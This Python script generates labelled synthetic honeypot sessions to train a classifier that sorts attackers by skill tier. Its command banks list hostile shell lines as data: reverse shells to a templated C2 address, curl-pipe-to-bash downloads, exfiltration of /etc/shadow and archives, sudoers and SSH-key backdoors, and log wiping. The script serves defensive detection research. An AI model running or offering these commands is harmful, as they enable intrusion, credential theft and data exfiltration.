#!/usr/bin/env python3
"""Generate a labelled multi-class training dataset for the Chrollo classifier.

Produces 500 synthetic honeypot sessions across the four skill tiers
(novice / intermediate / expert / apt, 125 each), grounded in:

* the FeatureExtractor's own pattern families (recon, scan, exploit,
  privesc, persistence, lateral movement, credential access, exfil,
  anti-forensics, compile) so every feature fires from real command
  semantics rather than fabricated numbers;
* per-tier behavioural profiles (session length, category mix, command
  pacing) inspired by the MITRE ATT&CK progression of scripted
  opportunistic attackers vs. operationally secure APT tradecraft.

Sessions within a tier vary via a Dirichlet-drawn category mix and
lognormal inter-command delays, so class boundaries overlap honestly
instead of being trivially separable. Labels are the intended tier; the
retraining script reports held-out metrics that include the inevitable
novice/intermediate and expert/apt boundary confusion.

Output (under data/training/):
  sessions.jsonl      - one SessionLog per line + "skill_level" field
  manifest.json       - generation parameters, class counts, per-class
                        feature statistics for auditability

Usage:
    python scripts/generate_training_data.py [--seed 42] [--per-class 125]
"""

from __future__ import annotations

import argparse
import hashlib
import json
import math
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import numpy as np

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from ragin.chrollo.features import FEATURE_NAMES, FeatureExtractor
from ragin.chrollo.models import CommandEntry, SessionLog, SkillLevel

REPO_ROOT = Path(__file__).resolve().parent.parent
OUT_DIR = REPO_ROOT / "data" / "training"

# ── Command templates ────────────────────────────────────────────────────────
# {ip}, {ip2}, {c2}, {cidr}, {svc}, {wordlist} are filled per session.
BANKS: dict[str, list[str]] = {
    "basic": [
        "ls", "ls -la", "pwd", "whoami", "id", "uname -a", "uptime",
        "free -m", "df -h", "cat /etc/os-release", "hostname", "env",
        "ps aux", "cd /tmp", "mkdir /tmp/x", "cat /etc/passwd",
        "ls /var/log", "ip a", "ifconfig", "echo hello", "wget http://{c2}/y.tgz",
        "tar xzf y.tgz", "history", "cat /proc/cpuinfo", "date",
    ],
    "recon": [
        "ls -la /home", "ls -la /root", "cat /etc/shadow", "netstat -antup",
        "ss -tulpn", "ps -ef", "crontab -l", "cat /etc/crontab",
        "iptables -L -n", "cat ~/.bash_history", "ls -la /opt /srv",
        "cat /etc/fstab", "find / -name '*.conf' 2>/dev/null | head -20",
        "docker ps -a", "cat ~/.ssh/known_hosts", "w", "last -a",
        "cat /etc/ssh/sshd_config", "lsof -i", "find / -type f -perm -o+w 2>/dev/null | head",
    ],
    "scan": [
        "nmap -sV -p 22,80,443 {ip}", "nmap -sS -T4 {cidr}",
        "masscan -p1-65535 {cidr} --rate=1000", "nikto -h http://{ip}",
        "gobuster dir -u http://{ip} -w /usr/share/wordlists/common.txt",
        "dirb http://{ip}", "whatweb http://{ip}", "ffuf -u http://{ip}/FUZZ -w /usr/share/wordlists/raft-small-words.txt",
        "rustscan -a {ip} -- -sV", "wfuzz -c -z file,/usr/share/wordlists/common.txt http://{ip}/FUZZ",
        "nmap --script vuln {ip}", "zmap -p 22 {cidr}",
    ],
    "exploit": [
        "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{c2}\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "bash -i >& /dev/tcp/{c2}/4444 0>&1",
        "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={c2} LPORT=4444 -f elf -o /tmp/pwn",
        "curl -fsSL http://{c2}/l.sh | bash",
        "wget http://{c2}/l.sh -O /tmp/l.sh && bash /tmp/l.sh",
        "python3 -m http.server 8000 --directory /tmp/ex",
        "./payload.sh", "/tmp/pwn", "python3 /tmp/exploit_46579.py {ip} 22",
        "curl -T /etc/passwd http://{c2}/up", "msfconsole -q -x 'use exploit/multi/handler; set LHOST {c2}; run'",
        "certutil -urlcache -split -f http://{c2}/l.exe l.exe",
        "echo 'rm -rf /tmp/.ICE-unix' > /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
    ],
    "privesc": [
        "sudo -l", "sudo -s", "sudo -i", "chmod 4755 /bin/bash",
        "find / -perm -4000 -type f 2>/dev/null", "getcap -r / 2>/dev/null",
        "pkexec --user root /bin/sh", "chown root:root /tmp/x",
        "cat /etc/sudoers", "echo 'webapp ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "chmod +s /bin/find", "setcap cap_setuid+ep /usr/bin/python3",
        "find / -writable -type d 2>/dev/null", "cat /proc/1/environ",
    ],
    "persist": [
        "crontab -e", "crontab -l",
        "echo '* * * * * /tmp/l.sh' | crontab -",
        "systemctl enable {svc}", "systemctl enable --now {svc}",
        "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoperator' >> /root/.ssh/authorized_keys",
        "mv /tmp/l.sh /etc/rc.local", "update-rc.d {svc} defaults",
        "nc -lvp 4444 -e /bin/bash", "echo 'nohup /tmp/l.sh &' >> ~/.bashrc",
        "echo 'export PATH=/tmp:$PATH' >> ~/.profile",
        "iptables -A INPUT -p tcp --dport 4444 -j ACCEPT",
        "chkconfig {svc} on", "at now + 10 minutes -f /tmp/l.sh",
    ],
    "lateral": [
        "ssh -J jumphost admin@{ip2}", "ssh -N -L 8080:{ip3}:80 admin@{ip2}",
        "sshpass -p 'Passw0rd!' ssh admin@{ip2}", "smbclient //10.0.2.15/share -U admin",
        "crackmapexec smb {cidr} -u admin -p 'Passw0rd!'", "evil-winrm -i {ip2} -u admin -p 'Passw0rd!'",
        "wmiexec.py admin:'Passw0rd!'@{ip2}", "psexec.py admin@{ip2}",
        "ssh-keygen -t ed25519 -f /tmp/k && ssh-copy-id -i /tmp/k admin@{ip2}",
        "nc -zv {ip2} 445", "impacket-smbexec admin@{ip2}",
    ],
    "creds": [
        "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt",
        "john --wordlist=/usr/share/wordlists/rockyou.txt hashes",
        "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{ip}",
        "medusa -h {ip} -U users.txt -P /usr/share/wordlists/rockyou.txt -M ssh",
        "mimikatz # sekurlsa::logonpasswords", "secretsdump.py admin@{ip2}",
        "cat ~/.ssh/id_rsa", "grep -rn 'password=' /home 2>/dev/null | head",
        "kerbrute userenum -d corp.local users.txt", "cat /etc/shadow > /tmp/sh.bak",
        "sshpass -p 'Passw0rd!' scp /etc/shadow exfil@{c2}:/tmp/",
        " CredentialDump ", "env | grep -i pass",
    ],
    "exfil": [
        "tar czf /tmp/e.tgz /etc", "curl -T /tmp/e.tgz http://{c2}/up",
        "scp /tmp/e.tgz exfil@{c2}:/tmp/", "gzip -c /var/log/auth.log | nc {c2} 9001",
        "rsync -az /etc {c2}::exfil", "python3 -c \"import base64,sys;print(base64.b64encode(open('/tmp/e.tgz','rb').read()).decode())\" | curl -X POST --data-binary @- http://{c2}/b64",
        "dd if=/dev/sda bs=1M count=64 | nc {c2} 9001", "7z a -p /tmp/e.7z /etc/ssh",
    ],
    "defense": [
        "history -c && rm -f ~/.bash_history", "unset HISTFILE", "shred -u /tmp/l.sh",
        "rm -rf /tmp/*", "echo > /var/log/auth.log", "sed -i '/l.sh/d' ~/.bash_history",
        "truncate -s 0 /var/log/syslog", "rm -f /var/log/wtmp /var/log/btmp",
        "touch -r /bin/ls /tmp/l.sh", "kill -9 $$",
    ],
    "compile": [
        "gcc /tmp/e.c -o /tmp/e", "gcc -static /tmp/e.c -o /tmp/e -lpthread",
        "gcc -o /tmp/pwn /tmp/exp.c -Wl,--hash-style=both", "make -C /tmp/kit",
        "python3 -c 'print(open(\"/tmp/e.c\").read())'",
    ],
}

# Per-tier generation profiles.
# mix: category -> mean share (a Dirichlet draw around this is used per session)
# n_range: commands per session
# dt_mu/dt_sigma: lognormal parameters for inter-command delay seconds.
#   Novices pause erratically (high CV); APT tooling runs at machine pace
#   with low variance. CV of lognormal = sqrt(exp(sigma^2)-1).
PROFILES: dict[SkillLevel, dict] = {
    SkillLevel.NOVICE: dict(
        mix={"basic": 0.55, "recon": 0.28, "scan": 0.05, "exploit": 0.04,
             "creds": 0.05, "privesc": 0.02, "persist": 0.01},
        mix_alpha=8.0, n_range=(6, 14), dt_mu=2.0, dt_sigma=1.2,
    ),
    SkillLevel.INTERMEDIATE: dict(
        mix={"basic": 0.22, "recon": 0.28, "scan": 0.18, "exploit": 0.11,
             "creds": 0.08, "privesc": 0.07, "persist": 0.04, "compile": 0.02},
        mix_alpha=8.0, n_range=(15, 30), dt_mu=0.8, dt_sigma=0.8,
    ),
    SkillLevel.EXPERT: dict(
        mix={"recon": 0.24, "scan": 0.14, "exploit": 0.19, "privesc": 0.15,
             "persist": 0.10, "lateral": 0.06, "creds": 0.05, "defense": 0.04,
             "compile": 0.03},
        mix_alpha=10.0, n_range=(35, 60), dt_mu=-0.5, dt_sigma=0.55,
    ),
    SkillLevel.APT: dict(
        mix={"recon": 0.11, "scan": 0.04, "exploit": 0.12, "privesc": 0.10,
             "persist": 0.15, "lateral": 0.12, "creds": 0.10, "exfil": 0.10,
             "defense": 0.10, "compile": 0.04, "basic": 0.02},
        mix_alpha=12.0, n_range=(50, 90), dt_mu=-1.0, dt_sigma=0.45,
    ),
}

_EPS = 1e-9


def _draw_mix(nprng: np.random.Generator, profile: dict) -> dict[str, float]:
    weights = profile["mix"]
    alpha = profile["mix_alpha"]
    shares = nprng.dirichlet([max(w, 0.02) * alpha for w in weights.values()])
    return dict(zip(weights, shares, strict=True))


def _pick_category(rng: random.Random, mix: dict[str, float]) -> str:
    r = rng.random()
    acc = 0.0
    for cat, p in mix.items():
        acc += p
        if r <= acc:
            return cat
    return next(iter(mix))


def _fill(template: str, rng: random.Random) -> str:
    ip = f"10.0.{rng.randint(0, 30)}.{rng.randint(2, 250)}"
    ip2 = f"172.16.{rng.randint(0, 10)}.{rng.randint(2, 250)}"
    ip3 = f"192.168.{rng.randint(0, 5)}.{rng.randint(2, 250)}"
    c2 = f"{rng.randint(45, 195)}.{rng.randint(10, 250)}.{rng.randint(10, 250)}.{rng.randint(2, 250)}"
    cidr = f"10.0.{rng.randint(0, 30)}.0/24"
    svc = rng.choice(["elastic", "postgres", "nginx", "c2-agent", "systemd-sysctl"])
    return (template.replace("{ip2}", ip2).replace("{ip3}", ip3)
            .replace("{cidr}", cidr).replace("{c2}", c2)
            .replace("{ip}", ip).replace("{svc}", svc))


def make_session(rng: random.Random, nprng: np.random.Generator, skill: SkillLevel,
                 idx: int) -> SessionLog:
    profile = PROFILES[skill]
    mix = _draw_mix(nprng, profile)
    n_cmds = rng.randint(*profile["n_range"])

    start = datetime.now(timezone.utc) - timedelta(days=rng.randint(1, 60),
                                                   seconds=rng.randint(0, 86400))
    commands: list[CommandEntry] = []
    t = start
    for _ in range(n_cmds):
        cat = _pick_category(rng, mix)
        template = rng.choice(BANKS[cat])
        cmd = _fill(template, rng)[:4096]
        commands.append(CommandEntry(timestamp=t, command=cmd,
                                     exit_code=0 if rng.random() < 0.85 else 1))
        delay = math.exp(rng.gauss(profile["dt_mu"], profile["dt_sigma"]))
        t = t + timedelta(seconds=max(delay, 0.05))

    return SessionLog(
        session_id=f"train-{skill.value}-{idx:04d}-{rng.randrange(10**8):08d}",
        source_ip=f"{rng.randint(1, 223)}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}",
        start_time=start,
        end_time=t,
        commands=commands,
        tags=["synthetic", f"tier:{skill.value}"],
        metadata={"generator": "generate_training_data.py", "tier": skill.value},
    )


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--per-class", type=int, default=125)
    args = ap.parse_args()

    rng = random.Random(args.seed)
    nprng = np.random.default_rng(args.seed)
    extractor = FeatureExtractor()

    OUT_DIR.mkdir(parents=True, exist_ok=True)
    sessions_path = OUT_DIR / "sessions.jsonl"
    manifest_path = OUT_DIR / "manifest.json"

    per_class: dict[str, int] = {}
    feature_sums: dict[str, dict[str, float]] = {
        lvl.value: {f: 0.0 for f in FEATURE_NAMES} for lvl in SkillLevel
    }

    with sessions_path.open("w") as fh:
        for skill in SkillLevel:
            for i in range(args.per_class):
                session = make_session(rng, nprng, skill, i)
                feats = extractor.extract(session)
                for f in FEATURE_NAMES:
                    feature_sums[skill.value][f] += feats[f]
                record = session.model_dump(mode="json")
                record["skill_level"] = skill.value
                fh.write(json.dumps(record) + "\n")
                per_class[skill.value] = per_class.get(skill.value, 0) + 1

    feature_means = {
        lvl: {f: round(total / per_class[lvl], 4) for f, total in sums.items()}
        for lvl, sums in feature_sums.items()
    }

    dataset_bytes = sessions_path.read_bytes()
    manifest = {
        "seed": args.seed,
        "per_class": per_class,
        "total": sum(per_class.values()),
        "feature_names": FEATURE_NAMES,
        "per_class_feature_means": feature_means,
        "sessions_sha256": hashlib.sha256(dataset_bytes).hexdigest(),
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "profiles": {
            lvl.value: {"n_range": p["n_range"], "dt_mu": p["dt_mu"], "dt_sigma": p["dt_sigma"],
                        "mix": p["mix"]}
            for lvl, p in PROFILES.items()
        },
    }
    manifest_path.write_text(json.dumps(manifest, indent=2))

    print(f"Wrote {sum(per_class.values())} sessions -> {sessions_path}")
    for lvl, means in feature_means.items():
        print(f"\n[{lvl}] class-conditional feature means:")
        print("  " + "  ".join(f"{f}={means[f]:.3f}" for f in FEATURE_NAMES))


if __name__ == "__main__":
    main()
